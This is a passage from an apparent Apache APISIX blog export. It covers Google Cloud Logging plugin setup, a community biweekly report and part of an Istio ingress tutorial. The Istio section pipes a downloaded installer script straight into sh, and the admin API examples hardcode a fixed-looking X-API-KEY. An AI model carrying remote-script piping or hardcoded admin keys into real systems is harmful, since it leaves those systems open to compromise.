service account name and ID (the ID usually follows the account generation), and then click \\"CREATE AND CONTINUE\\".\\n    ![create a service account-2](https://static.apiseven.com/202108/1640137834702-76166e6f-ed98-4a85-a759-2ce78f795794.png)\\n10. Click on \\"Role\\" and type \\"Logging Admin\\" in the search box to search for this role and select \\"Logging Admin\\" as the role.\\n    ![create a service account-3](https://static.apiseven.com/202108/1640137883981-0f780040-8398-4d38-9600-a5e54b29b48e.png)\\n11. Click \\"DONE\\" to complete the service account creation and jump to the service account home page. At this point you can see the account you just created and its details in the list.\\n    ![service account information](https://static.apiseven.com/202108/1640137970837-ed1994be-87d0-48b8-bec5-010200fe1f1d.png)\\n12. Click \\"Manage keys\\" in the last column of the service account to enter the secret key management interface.\\n    ![enter secret key management interface](https://static.apiseven.com/202108/1640138660649-cd57da29-5965-4251-9deb-300de830dfd9.png)\\n13. Click \\"ADD KEY > Create new key\\" to start creating a new secret key.\\n    ![create a new secret key](https://static.apiseven.com/202108/1640138732589-1aea201b-de2d-455a-8c04-c3f5a28dfa91.png)\\n14. Select the secret key type as \\"JSON\\" in the pop-up page, and then click \\"CREATE\\" to create a new secret key.\\n    ![create a new secret key-2](https://static.apiseven.com/202108/1640138785425-23ee8efe-bc0d-428a-a627-2f428440da37.png)\\n15. The private key information will be automatically downloaded to the system default Downloads directory through your browser . When you enable google-cloud-logging plugin, you need to use the information in this private key, so please save the private key file.\\n    ![Download your key](https://static.apiseven.com/202108/1640138820163-aa459874-e78e-4156-ab74-58fc7e2ae13f.png)\\n\\n## Configure Apache APISIX\\n\\n### Enable google-cloud-logging plugin\\n\\n#### Option 1: Upload key file configuration\\n\\n1. Upload the private key file to the Apache APISIX node server.\\n2. Configure the file path to the `google-cloud-logging.auth_file`, as shown below:\\n\\n```shell\\ncurl http://127.0.0.1:9080/apisix/admin/routes/1  -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"uri\\":\\"/logging.do\\",\\n    \\"upstream\\":{\\n        \\"type\\":\\"roundrobin\\",\\n        \\"nodes\\":{\\n            \\"127.0.0.1:1980\\":1\\n        }\\n    },\\n    \\"plugins\\":{\\n        \\"google-cloud-logging\\":{\\n            // Google Cloud Logging Private Key File\\n            \\"auth_file\\":\\"/path/to/apache-apisix-fcafc68c2f41.json\\",\\n            // Maximum number of entries per batch queue.\\n            \\"batch_max_size\\": 1,\\n            // Maximum time to refresh the buffer in seconds.\\n            \\"inactive_timeout\\": 10\\n        }\\n    }\\n}\'\\n```\\n\\n#### Option 2: Declare configurations in JSON\\n\\n1. Open the private key file.\\n2. Configure the value of `project_id` to `google-cloud-logging.auth_config.project_id`.\\n3. Configure the value of `private_key` to `google-cloud-logging.auth_config.private_key`.\\nAs shown below:\\n\\n```shell\\ncurl http://127.0.0.1:9080/apisix/admin/routes/1  -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"uri\\":\\"/logging.do\\",\\n    \\"upstream\\":{\\n        \\"type\\":\\"roundrobin\\",\\n        \\"nodes\\":{\\n            \\"127.0.0.1:1980\\":1\\n        }\\n    },\\n    \\"plugins\\":{\\n        \\"google-cloud-logging\\":{\\n            // Google Cloud Logging Private Key File\\n            \\"auth_config\\":{\\n                \\"project_id\\":\\"apache-apisix\\",\\n                \\"private_key\\":\\"-----BEGIN RSA PRIVATE KEY-----your private key-----END RSA PRIVATE KEY-----\\"\\n            },\\n            // Maximum number of entries per batch queue.\\n            \\"batch_max_size\\": 1,\\n            // Maximum time to refresh the buffer in seconds.\\n            \\"inactive_timeout\\": 10\\n        }\\n    }\\n}\'\\n```\\n\\n#### Parameters\\n\\n|Name|Required|Defualt Value|Description|\\n|:-----|:-----|:-----|:-----|\\n|auth_config|No|n/a|Google Cloud Logging Private Key File. Either auth_config or auth_file must be configured.|\\n|auth_config.private_key|Yes|n/a|Google Cloud Logging Private Key.|\\n|auth_config.project_id|Yes|n/a|Project ID of Google Service Account.|\\n|auth_config.token_uri|No|oauth2.googleapis.com/token|The URI of the token requesting the Google Services account.|\\n|auth_config.entries_uri|No|logging.googleapis.com/v2/entries:write|Google Log Service Write Log Entry API.|\\n|auth_config.scopes|No|[\\"https://www.googleapis.com/auth/logging.read\\",\\"https://www.googleapis.com/auth/logging.write\\",\\"https://www.googleapis.com/auth/logging.admin\\",\\"https://www.googleapis.com/auth/cloud-platform\\"]|Google Services account access scope, refer to: [OAuth 2.0 Scopes for Google APIs](https://developers.google.com/identity/protocols/oauth2/scopes#logging)|\\n|auth_file|No|n/a|Path to the Google Services account JSON file (either auth_config or auth_file must be configured)|\\n|ssl_verify|No|TRUE|Enable SSL authentication, configured according to [OpenResty documentation](https://github.com/openresty/lua-nginx-module#tcpsocksslhandshake) options.|\\n|resource|No|{\\"type\\": \\"global\\"}|Google Monitored Resources, please refer to [MonitoredResource](https://cloud.google.com/logging/docs/reference/v2/rest/v2/MonitoredResource).|\\n|log_id|No|apisix.apache.org%2Flogs|Google Log ID, reference: [LogEntry](https://cloud.google.com/logging/docs/reference/v2/rest/v2/LogEntry).|\\n|max_retry_count|No|0|Maximum number of retries before removal from the processing pipeline.|\\n|retry_delay|No|1|Number of seconds that process execution should be delayed if execution fails.|\\n|buffer_duration|No|60|The maximum duration (in seconds) of the oldest entry in the batch must be processed first.|\\n|inactive_timeout|No|10|Maximum time to refresh the buffer in seconds.|\\n|batch_max_size|No|100|Maximum time to refresh the buffer in seconds.|\\n\\n### Verify plugin is running normally\\n\\n1. Run the following command to send a request to Google Cloud Logging.\\n\\n   ```shell\\n    curl -i http://127.0.0.1:9080/logging.do\\n    HTTP/1.1 200 OK\\n    Content-Type: text/html; charset=utf-8\\n    Transfer-Encoding: chunked\\n    Connection: keep-alive\\n    Date: Fri, 10 Dec 2021 09:57:52 GMT\\n    Server: APISIX/2.11.0\\n\\n    Hello, Google Cloud Logging\\n   ```\\n\\n2. Open your browser and visit Google Cloud Homepage.\\n3. Enter your username and password to log in to the Google Cloud console.\\n4. View the log of requests sent through the log browser, and the returned results are shown below.\\n   ![View the log](https://static.apiseven.com/202108/1640139014263-fac86f87-d008-475c-aeae-289ab4ba62a8.png)\\n\\n### Disable google-cloud-logging plugin\\n\\nYou can remove the google-cloud-logging related configuration block to deactivate the plugin if you are finished using it.\\n\\n```shell\\ncurl http://127.0.0.1:9080/apisix/admin/routes/1  -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"uri\\":\\"/logging.do\\",\\n    \\"upstream\\":{\\n        \\"type\\":\\"roundrobin\\",\\n        \\"nodes\\":{\\n            \\"127.0.0.1:1980\\":1\\n        }\\n    },\\n    \\"plugins\\":{\\n    }\\n}\'\\n```\\n\\n## Summary\\n\\nThis article describes the detailed steps for interfacing Apache APISIX and Google Cloud Logging. We hope this article will give you a clearer understanding of using Google Cloud Logging in Apache APISIX and facilitate the subsequent hands-on operation.\\n\\nApache APISIX is not only committed to maintaining its own high performance, but also has always attached great importance to the construction of open source ecology. At present, Apache APISIX has 10+ logging-related plugins and supports interfacing with mainstream open source logging projects in the industry.\\n\\nIf you have a need to interface to other logs, visit Apache APISIX\'s [GitHub](https://github.com/apache/apisix/issues) and leave your suggestions via issue; or subscribe to the Apache APISIX [mailing list](https://apisix.apache.org/docs/general/join/) and express your thoughts via email.\\n\\n## Related articles\\n\\n[Apache APISIX Integrates with SkyWalking to Create a Full Range of Log Processing](https://apisix.apache.org/blog/2021/12/07/apisix-integrate-skywalking-plugin/)\\n\\n[Apache APISIX & RocketMQ Helps User API Log Monitoring Capabilities](https://apisix.apache.org/blog/2021/12/08/apisix-integrate-rocketmq-logger-plugin/)"},{"id":"Biweekly Report (Dec 1 - Dec 15)","metadata":{"permalink":"/blog/2021/12/20/weekly-report-1215","source":"@site/blog/2021/12/20/weekly-report-1215.md","title":"Biweekly Report (Dec 1 - Dec 15)","description":"The API gateway Apache APISIX has added rocketmq-logger and opa plugins in the past two weeks, as well as Wasm support to run in the rewrite phase.","date":"2021-12-20T00:00:00.000Z","formattedDate":"December 20, 2021","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":3.72,"truncated":true,"authors":[],"prevItem":{"title":"APISIX Integrates with Google Cloud Logging","permalink":"/blog/2021/12/22/google-logging"},"nextItem":{"title":"Secure Exposure of Istio Services with APISIX Ingress","permalink":"/blog/2021/12/17/exposure-istio-with-apisix-ingress"}},"content":"> From 12.1 to 12.15, 38 contributors submitted 114 commits for Apache APISIX. Thank you all for your contributions to Apache APISIX. It is your selfless contribution to make the Apache APISIX project better!\\n\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nApache APISIX has grown as a community from the first day of open source and has quickly become the most active open source API gateway project in the world. These achievements cannot be achieved without the joint efforts of our community partners.\\n\\n\\"If you want to go fast, go alone.If you want to go far, go together.\\" The Apache APISIX Community Weekly Report hopes to help community members better understand the weekly progress of the Apache APISIX community and and facilitate everyone to participate in the Apache APISIX community.\\n\\nWe have also compiled some issues suitable for newcomers to the community to participate in! If you are interested, don\'t miss it!\\n\\n## Contributor Statistics\\n\\n![Contributors List](https://static.apiseven.com/202108/1639981796665-784d48cd-76ad-4a21-974b-23c5a0dcf1dd.png)\\n\\n![New Contributors](https://static.apiseven.com/202108/1639981796682-ab41c626-8674-4503-b642-a9714189e51f.png)\\n\\n## Good first issue\\n\\n### Issue #5795\\n\\n**Link**: https://github.com/apache/apisix/issues/5795\\n\\n**Issue description**:\\n\\nSometimes, we just need install etcd, ref here. But install_dependencies.sh not support this feature, it will install all dependencies of APISIX. Should we support install etcd separately in install_dependencies.sh ?\\n\\nexample:\\n\\n```Nginx\\nbash install_dependencies.sh etcd\\n```\\n\\n### Issue #5756\\n\\n**Link**: https://github.com/apache/apisix/issues/5756\\n\\n**Issue description**:\\n\\nThe current openwhisk plugin will take the response from Apache OpenWhisk and return it directly without parsing. This request may contain complex data that rewrites the status code, response headers, and response body. We need to parse it and change the APISIX response.\\n\\nThe complex data like this:\\n\\n```JSON\\n{\\n  \\"statusCode\\": 401,\\n  \\"headers\\": {\\n    \\"addition-header\\": \\"a-header\\"\\n  },\\n  \\"body\\": \\"xxx\\" | {\\"xxx\\":\\"xxx\\"}\\n}\\n```\\n\\nWe need to determine if the OpenWhisk response contains them, and if they are present, write them to the APISIX response.\\n\\n### Issue #5634\\n\\n**Link**: https://github.com/apache/apisix/issues/5634\\n\\n**Issue description**:\\n\\nNow, I see we had support `var`, `var_combination` in apisix limit-* plugins yet.\\n\\nI think we can support a type like `function` so that we can write some logic as a function in the key.\\n\\nThen we can get the key from the function.\\n\\n## Highlights of Recent Features\\n\\n- [mqtt-proxy plugin supports using route\'s upstream](https://github.com/apache/apisix/pull/5666)\uff08Contributor: [spacewander](https://github.com/spacewander)\uff09\\n\\n- [APISIX Supports resolve default value when environment not set](https://github.com/apache/apisix/pull/5675)\uff08Contributor: [kevinw66](https://github.com/kevinw66)\uff09\\n\\n- [New rocketmq-logger plugin, which send log to rocketmq](https://github.com/apache/apisix/pull/5653)\uff08Contributor: [yuz10](https://github.com/yuz10)\uff09\\n\\n- [APISIX wasm allows running in the rewrite phase](https://github.com/apache/apisix/pull/5695)\uff08Contributor: [spacewander](https://github.com/spacewander)\uff09\\n\\n- [Add http_server_location_configuration_snippet configuration](https://github.com/apache/apisix/pull/5740)\uff08Contributor: [zlhgo](https://github.com/zlhgo)\uff09\\n\\n- [APISIX stream subsystem supports logging](https://github.com/apache/apisix/pull/5768)\uff08Contributor: [bisakhmondal](https://github.com/bisakhmondal)\uff09\\n\\n- [Add OPA plugin to support API access control using OPA services](https://github.com/apache/apisix/pull/5734)\uff08Contributor: [bzp2010](https://github.com/bzp2010)\uff09\\n\\n- [Integrates HashiCorp Vault with APISIX jwt-auth authentication plugin](https://github.com/apache/apisix/pull/5745)\uff08Contributor: [bisakhmondal](https://github.com/bisakhmondal)\uff09\\n\\n- [Dashboard supports configuring the use of POST form data as an advanced match condition](https://github.com/apache/apisix-dashboard/pull/2231)\uff08Contributor: [bzp2010](https://github.com/bzp2010)\uff09\\n\\n- [Panic caused by ApisixUpstream resources without spec fields can be avoided in Apache APISIX Ingresss](https://github.com/apache/apisix-ingress-controller/pull/794)\uff08Contributor: [Brhetty](https://github.com/Brhetty)\uff09\\n\\n- [Add regular matching support for Ingress resources in Apache APISIX Ingress](https://github.com/apache/apisix-ingress-controller/pull/779)\uff08Contributor: [lxm](https://github.com/lxm)\uff09\\n\\nThe Apache APISIX project website and the Github issue have accumulated a wealth of documentation and experience, so if you encounter problems, you can read the documentation, search the issue with keywords, or participate in the discussion on the issue to put forward your own ideas and practical experience.\\n\\n## Recent Blog Recommendations\\n\\n- [Secure Exposure of Istio Services with APISIX Ingress](https://apisix.apache.org/blog/2021/12/17/exposure-istio-with-apisix-ingress)\uff1a\\n\\n  This article shows you step by step how to use Istio Service Mesh and Apache APISIX, to expose services in a Service Mesh-enabled Kubernetes cluster to the outside of the cluster through very detailed steps.\\n\\n- [How to Easily Deploy Apache APISIX in Kubernetes](https://apisix.apache.org/blog/2021/12/15/deploy-apisix-in-kubernetes)\uff1a\\n\\n  Apache APISIX currently supports multiple ways to install and deploy. This article focuses on how to deploy Apach APISIX and APISIX-Dashboard in a Kubernetes environment.\\n\\n- [Monitoring APISIX Ingress Controller with Prometheus](https://apisix.apache.org/blog/2021/12/13/monitor-apisix-ingress-controller-with-prometheus)\uff1a\\n\\n  This article introduces the relevant steps of how to use Prometheus to monitor APISIX Ingress Controller and the display effect of some indicators.\\n\\n- [How to Integrate Keycloak for Authentication with Apache APISIX](https://apisix.apache.org/blog/2021/12/10/integrate-keycloak-auth-in-apisix)\uff1a\\n\\n  This article shows you how to use OpenID-Connect protocol and Keycloak for identity authentication in Apache APISIX through detailed steps.\\n\\n- [Apache APISIX & RocketMQ Helps User API Log Monitoring Capabilities](https://apisix.apache.org/blog/2021/12/08/apisix-integrate-rocketmq-logger-plugin)\uff1a\\n\\n  This article will introduce the latest integration of Apache APISIX and Apache RocketMQ rocketmq-logger plug-in features and use. With this plug-in, you can connect to the RocketMQ cluster more easily when using Apache APISIX.\\n  \\n- [Apache APISIX Integrates with SkyWalking to Create a Full Range of Log Processing](https://apisix.apache.org/blog/2021/12/07/apisix-integrate-skywalking-plugin)\uff1a\\n\\n  This paper mainly introduces two Apache APISIX integrated SkyWalking log plug-ins to provide a more convenient operation and environment for log processing in Apache APISIX."},{"id":"Secure Exposure of Istio Services with APISIX Ingress","metadata":{"permalink":"/blog/2021/12/17/exposure-istio-with-apisix-ingress","source":"@site/blog/2021/12/17/exposure-istio-with-apisix-ingress.md","title":"Secure Exposure of Istio Services with APISIX Ingress","description":"This article shows how to use Istio Service Mesh and API Gateway Apache APISIX to expose services from a Service Mesh-enabled Kubernetes cluster outside the cluster.","date":"2021-12-17T00:00:00.000Z","formattedDate":"December 17, 2021","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":8.895,"truncated":true,"authors":[{"name":"Jintao Zhang","title":"Author","url":"https://github.com/tao12345666333","image_url":"https://avatars.githubusercontent.com/u/3264292?v=4","imageURL":"https://avatars.githubusercontent.com/u/3264292?v=4"},{"name":"Sylvia","title":"Technical Writer","url":"https://github.com/SylviaBABY","image_url":"https://avatars.githubusercontent.com/u/39793568?v=4","imageURL":"https://avatars.githubusercontent.com/u/39793568?v=4"}],"prevItem":{"title":"Biweekly Report (Dec 1 - Dec 15)","permalink":"/blog/2021/12/20/weekly-report-1215"},"nextItem":{"title":"Webinar | Apache APISIX \xd7 Apache RocketMQ Online Meetup","permalink":"/blog/2021/12/16/apisix-with-rocketmq-meetup"}},"content":"> This article shows you step by step how to use Istio Service Mesh and Apache APISIX, to expose services in a Service Mesh-enabled Kubernetes cluster to the outside of the cluster through very detailed steps.\\n\\n\x3c!--truncate--\x3e\\n\\n## Service Mesh\\n\\nWith the hot development of Cloud-Native technology, Service Mesh is gradually becoming popular in the microservices field. The popular implementations of Service Mesh are [Istio](https://istio.io/) and [Linkerd](https://linkerd.io/).\\n\\nThe following diagram shows the schematic diagram of Service Mesh, which introduces Sidecar Proxy to complete the interconnection and communication between microservices.\\n\\n![Service Mesh](https://static.apiseven.com/202108/1639730484170-fbf2e5ed-3041-4975-8730-a16c92be68f2.png)\\n\\nThe diagram above shows that Service Mesh focuses more on east-west traffic in the traditional sense, i.e., traffic between services. When we use Service Mesh with Kubernetes, the east-west traffic corresponds to the traffic within the Kubernetes cluster.\\n\\nBack in real-world usage scenarios, we won\'t only be exposed to traffic within the Kubernetes cluster, we will mostly need to expose some services outside of the cluster for users or other services to use. But when exposing services in a Kubernetes cluster outside the cluster, we have to consider factors such as security and observability.\\n\\nWe\'ll show you how to securely expose services in a Service Mesh-enabled Kubernetes cluster outside the cluster using Istio Service Mesh and Apache APISIX.\\n\\n![How to deal](https://static.apiseven.com/202108/1639730236819-0911b90b-811f-4451-b0e5-f89ac3e04b77.png)\\n\\n## Step 1: Prepare the Kubernetes cluster\\n\\nHere we use [Kind](https://github.com/kubernetes-sigs/kind/) to create a temporary cluster locally for demonstration purposes. You can refer to the [official documentation](https://kind.sigs.k8s.io/docs/user/quick-start/#installation) for how to install it with the Kind command.\\n\\nHere is the yaml configuration file used to create the demo cluster, save it as `kind-config.yaml`.\\n\\n```yaml\\nkind: Cluster\\napiVersion: kind.x-k8s.io/v1alpha4\\nnodes:\\n- role: control-plane\\n- role: worker\\n- role: worker\\n- role: worker\\n```\\n\\nThen use this configuration file to create a cluster.\\n\\n```bash\\n(MoeLove) \u279c kind create cluster --config kind-config.yaml\\nCreating cluster \\"kind\\" ...\\n \u2713 Ensuring node image (kindest/node:v1.22.2) \ud83d\uddbc\\n \u2713 Preparing nodes \ud83d\udce6 \ud83d\udce6 \ud83d\udce6 \ud83d\udce6  \\n \u2713 Writing configuration \ud83d\udcdc\\n \u2713 Starting control-plane \ud83d\udd79\ufe0f\\n \u2713 Installing CNI \ud83d\udd0c\\n \u2713 Installing StorageClass \ud83d\udcbe\\n \u2713 Joining worker nodes \ud83d\ude9c\\nSet kubectl context to \\"kind-kind\\"\\nYou can now use your cluster with:\\n\\nkubectl cluster-info --context kind-kind\\n\\nNot sure what to do next? \ud83d\ude05  Check out https://kind.sigs.k8s.io/docs/user/quick-start/\\n```\\n\\n## Step 2: Deploy Istio\\n\\nAfter the Kubernetes cluster is created, let\'s deploy Istio.\\n\\nFirst, create a directory named `apisix-istio` and do the following after entering the directory.\\n\\n```bash\\n(MoeLove) \u279c mkdir apisix-istio\\n(MoeLove) \u279c cd apisix-istio\\n(MoeLove) \u279c curl -sL https://istio.io/downloadIstio | sh -\\n\\nDownloading istio-1.12.1 from https://github.com/istio/istio/releases/download/1.12.1/istio-1.12.1-linux-amd64.tar.gz ...\\n\\nIstio 1.12.1 Download Complete!\\n\\nIstio has been successfully downloaded into the istio-1.12.1 folder on your system.\\n\\nNext Steps:\\nSee https://istio.io/latest/docs/setup/install/ to add Istio to your Kubernetes cluster.\\n\\nTo configure the istioctl client tool for your workstation,\\nadd the /root/apisix-istio/istio-1.12.1/bin directory to your environment path variable with:\\n         export PATH=\\"$PATH:/root/apisix-istio/istio-1.12.1/bin\\"\\n\\nBegin the Istio pre-installation check by running:\\n         istioctl x precheck\\n\\nNeed more information? Visit https://istio.io/latest/docs/setup/install/\\n```\\n\\nWhen the above operation is completed, a new directory will be created under the current directory. We can follow the output of the above command to continue the operation.\\n\\n```bash\\n(MoeLove) \u279c ls\\nistio-1.12.1\\n(MoeLove) \u279c export PATH=\\"$PATH:/root/apisix-istio/istio-1.12.1/bin\\"\\n(MoeLove) \u279c istioctl x precheck\\n\u2714 No issues found when checking the cluster. Istio is safe to install or upgrade!\\n  To get started, check out https://istio.io/latest/docs/setup/getting-started/\\n```\\n\\nNext, the real deployment process begins. Just set it to `--set profile=minimal` for a minimal installation.\\n\\n```bash\\n(MoeLove) \u279c istioctl install --set profile=minimal  -y\\n\u2714 Istio core\\ninstalled\\n\\n\u2714 Istiod\\ninstalled\\n\\n\u2714 Installation\\ncomplete\\n\\nMaking this installation the default for injection and validation.\\n\\nThank you for installing Istio 1.12.  Please take a few minutes to tell us about your install/upgrade experience!  https://forms.gle/FegQbc9UvePd4Z9z7\\n```\\n\\nFinally, check the current deployment status and you can see that the Pod is already running.\\n\\n```bash\\n(MoeLove) \u279c kubectl -n istio-system get pods\\nNAME                      READY   STATUS    RESTARTS   AGE\\nistiod-58d79b7bff-g66cv   1/1     Running   0          1m\\n```\\n\\n## Step 3: Deploy Apache APISIX\\n\\nNext, we will deploy Apache APISIX.\\n\\nFirst create a Namespace named `apisix-istio` and enable auto-injection.\\n\\n```bash\\n(MoeLove) \u279c kubectl create ns apisix-istio\\nnamespace/apisix-istio created\\n(MoeLove) \u279c kubectl label namespace apisix-istio istio-injection=enabled\\nnamespace/apisix-istio labeled\\n```\\n\\nNext, add Helm Repo and use Helm for Apache APISIX and Apache APISIX Ingress Controller deployments.\\n\\n```bash\\n(MoeLove) \u279c helm repo add apisix https://charts.apiseven.com\\n\\"apisix\\" has been added to your repositories\\n(MoeLove) \u279c helm install apisix-istio apisix/apisix --set gateway.type=NodePort --set ingress-controller.enabled=true --set ingress-controller.config.apisix.serviceNamespace=apisix-istio  --set ingress-controller.config.apisix.serviceName=apisix-istio-admin  --namespace apisix-istio\\nNAME: apisix-istio\\nLAST DEPLOYED: Wed Dec 15 14:16:33 2021\\nNAMESPACE: apisix-istio\\nSTATUS: deployed\\nREVISION: 1\\nTEST SUITE: None\\nNOTES:\\n1. Get the application URL by running these commands:\\n  export NODE_PORT=$(kubectl get --namespace apisix-istio -o jsonpath=\\"{.spec.ports[0].nodePort}\\" services apisix-istio-gateway)\\n  export NODE_IP=$(kubectl get nodes --namespace apisix-istio -o jsonpath=\\"{.items[0].status.addresses[0].address}\\")\\n  echo http://$NODE_IP:$NODE_PORT\\n```\\n\\nAfter executing the above command, you can wait for all Pods to run normally by executing the following command.\\n\\n```bash\\n(MoeLove) \u279c kubectl -n apisix-istio wait --for=condition=Ready pods --all\\npod/apisix-istio-7bdfcb4bd9-89jcn condition met\\npod/apisix-istio-etcd-0 condition met\\npod/apisix-istio-etcd-1 condition met\\npod/apisix-istio-etcd-2 condition met\\npod/apisix-istio-ingress-controller-5fcbb75b8c-b4nnc condition met\\n```\\n\\nYou can see that all the Pods are currently running properly. Next, let\'s test and verify.\\n\\n## Test Session\\n\\n### Simple test\\n\\nWhen we deployed Apache APISIX using Helm earlier, we selected the service exposure method as `NodePort`, so we can then access Apache APISIX directly using the following command.\\n\\n```bash\\n(MoeLove) \u279c export NODE_PORT=$(kubectl get --namespace apisix-istio -o jsonpath=\\"{.spec.ports[0].nodePort}\\" services apisix-istio-gateway)\\n(MoeLove) \u279c export NODE_IP=$(kubectl get nodes --namespace apisix-istio -o jsonpath=\\"{.items[0].status.addresses[0].address}\\")\\n(MoeLove) \u279c curl http://$NODE_IP:$NODE_PORT\\n{\\"error_msg\\":\\"404 Route Not Found\\"}\\n```\\n\\nNote that when requesting with the `curl` command we add a `-v` option to look at the response headers of the request.\\n\\n```bash\\n(MoeLove) \u279c curl -v http://$NODE_IP:$NODE_PORT\\n* Rebuilt URL to: http://172.20.0.2:31225/\\n*   Trying 172.20.0.2...\\n* TCP_NODELAY set\\n* Connected to 172.20.0.2 (172.20.0.2) port 31225 (#0)\\n> GET / HTTP/1.1\\n> Host: 172.20.0.2:31225\\n> User-Agent: curl/7.58.0\\n> Accept: */*\\n>\\n< HTTP/1.1 404 Not Found\\n< date: Wed, 15 Dec 2021 14:31:40 GMT\\n< content-type: text/plain; charset=utf-8\\n< server: istio-envoy\\n< x-envoy-upstream-service-time: 1\\n< x-envoy-decorator-operation: apisix-istio-gateway.apisix-istio.svc.cluster.local:80/*\\n< transfer-encoding: chunked\\n<\\n{\\"error_msg\\":\\"404 Route Not Found\\"}\\n* Connection #0 to host 172.20.0.2 left intact\\n```\\n\\nAs you can see from the above output, the response header contains the following.\\n\\n```bash\\n< server: istio-envoy\\n< x-envoy-upstream-service-time: 1\\n< x-envoy-decorator-operation: apisix-istio-gateway.apisix-istio.svc.cluster.local:80/*\\n```\\n\\nThis means that Istio\'s auto-injection has succeeded, and that it is not Apache APISIX but Istio\'s Sidecar that is currently interacting directly.\\n\\n### BookInfo Deployment Testing\\n\\nNext, we use Istio\'s own BookInfo sample application to perform the relevant tests.\\n\\nFirst, create a Namespace and enable Istio\'s auto-injection.\\n\\n```bash\\n(MoeLove) \u279c kubectl create ns bookinfo\\nnamespace/bookinfo created\\n(MoeLove) \u279c kubectl label namespace bookinfo istio-injection=enabled\\nnamespace/bookinfo labeled\\n```\\n\\nBookInfo deployment is then performed and the relevant deployment files are automatically created in the directory during the above-mentioned Istio installation.\\n\\n```bash\\n(MoeLove) \u279c kubectl -n bookinfo apply -f istio-1.12.1/samples/bookinfo/platform/kube/bookinfo.yaml\\nservice/details created\\nserviceaccount/bookinfo-details created\\ndeployment.apps/details-v1 created\\nservice/ratings created\\nserviceaccount/bookinfo-ratings created\\ndeployment.apps/ratings-v1 created\\nservice/reviews created\\nserviceaccount/bookinfo-reviews created`\\ndeployment.apps/reviews-v1 created\\ndeployment.apps/reviews-v2 created\\ndeployment.apps/reviews-v3 created\\nservice/productpage created\\nserviceaccount/bookinfo-productpage created\\ndeployment.apps/productpage-v1 created\\n```\\n\\nWait for all Pods to run normally.\\n\\n```bash\\n(MoeLove) \u279c kubectl -n bookinfo get pods\\nNAME                             READY   STATUS    RESTARTS   AGE\\ndetails-v1-96cf758d8-qr6p9       2/2     Running   0          64s\\nproductpage-v1-5f75dfbfb-22hcw   2/2     Running   0          64s\\nratings-v1-779dbc4fdd-jt5zp      2/2     Running   0          64s\\nreviews-v1-ffbbf7fc8-kxvrr       2/2     Running   0          64s\\nreviews-v2-54546c6f84-pnjkn      2/2     Running   0          64s\\nreviews-v3-74d6bf84cd-h4r9z      2/2     Running   0          63s\\n```\\n\\nNow we can use Apache APISIX to expose the service outside the Kubernetes cluster. Create a routing configuration using the following and save it as `productpage-ar.yaml`.\\n\\n```yaml\\napiVersion: apisix.apache.org/v2beta2\\nkind: ApisixRoute\\nmetadata:\\n name: productpage\\nspec:\\n http:\\n - name: rule1\\n   match:\\n     hosts:\\n     - apisix-istio.dev\\n     paths:\\n       - /*\\n   backends:\\n   - serviceName: productpage\\n     servicePort: 9080\\n```\\n\\n:::note\\nThe above configuration can be interpreted as creating a route with the domain name `apisix-istio.dev` and forwarding all request traffic to port `9080` of the `productpage` service.\\n:::\\n\\nThen create this resource.\\n\\n```bash\\n(MoeLove) \u279c kubectl -n bookinfo apply -f productpage-ar.yaml\\napisixroute.apisix.apache.org/productpage created\\n```\\n\\nRequest Apache APISIX again with the domain name we just configured, and you will see that a `200` related prompt is returned.\\n\\n```bash\\n(MoeLove) \u279c curl -I -H \\"HOST: apisix-istio.dev\\" http://$NODE_IP:$NODE_PORT/\\nHTTP/1.1 200 OK\\ncontent-type: text/html; charset=utf-8\\ncontent-length: 1683\\ndate: Wed, 15 Dec 2021 15:47:30 GMT\\nx-envoy-upstream-service-time: 7\\nserver: istio-envoy\\nx-envoy-decorator-operation: apisix-istio-gateway.apisix-istio.svc.cluster.local:80/*\\n```\\n\\nThe Apache APISIX port can then be exposed via `port-forward`.\\n\\n```bash\\n(MoeLove) \u279c kubectl -n apisix-istio port-forward --address 0.0.0.0 svc/apisix-istio-gateway 8080:80\\nForwarding from 0.0.0.0:8080 -> 9080\\n```\\n\\nFinally, set the Header of `HOST: apisix-istio.dev` in your browser and try to make a request, you will get the correct page as shown below.\\n\\n![Correct page](https://static.apiseven.com/202108/1639713895938-dec7460b-fa51-443e-a32e-fe2000788127.png)\\n\\n## Visualization tool: Kiali\\n\\nKiali is a tool that allows visualization of Istio and can be installed as an Istio add-on.\\n\\nIt is deployed here directly using the configuration files in the `addons` directory carried by Istio.\\n\\n```bash\\n(MoeLove) \u279c kubectl -n istio-system apply -f  istio-1.12.1/samples/addons/\\nserviceaccount/grafana created\\nconfigmap/grafana created\\nservice/grafana created\\ndeployment.apps/grafana created\\nconfigmap/istio-grafana-dashboards created\\nconfigmap/istio-services-grafana-dashboards created\\ndeployment.apps/jaeger created\\nservice/tracing created\\nservice/zipkin created\\nservice/jaeger-collector created\\nserviceaccount/kiali created\\nconfigmap/kiali created\\nclusterrole.rbac.authorization.k8s.io/kiali-viewer created\\nclusterrole.rbac.authorization.k8s.io/kiali created\\nclusterrolebinding.rbac.authorization.k8s.io/kiali created\\nrole.rbac.authorization.k8s.io/kiali-controlplane created\\nrolebinding.rbac.authorization.k8s.io/kiali-controlplane created\\nservice/kiali created\\ndeployment.apps/kiali created\\nserviceaccount/prometheus created\\nconfigmap/prometheus created\\nclusterrole.rbac.authorization.k8s.io/prometheus created\\nclusterrolebinding.rbac.authorization.k8s.io/prometheus created\\nservice/prometheus created\\ndeployment.apps/prometheus created\\n```\\n\\nWait for the normal operation of Pod to view:\\n\\n```bash\\n(MoeLove) \u279c kubectl -n istio-system get pods\\nNAME                          READY   STATUS    RESTARTS   AGE\\ngrafana-6ccd56f4b6-wq6k5      1/1     Running   0          2m12s\\nistiod-58d79b7bff-g66cv       1/1     Running   0          42m\\njaeger-5d44bc5c5d-84ksf       1/1     Running   0          2m11s\\nkiali-79b86ff5bc-w457g        1/1     Running   0          2m3s\\nprometheus-64fd8ccd65-2mjcc   2/2     Running   0          2m9s\\n```\\n\\nNext, execute the following command to port-forward Kiali and access it in the browser. Of course, you can do the same thing with the above port-forward.\\n\\n```\\n(MoeLove) \u279c istioctl dashboard kiali  --address 0.0.0.0 --port 9999 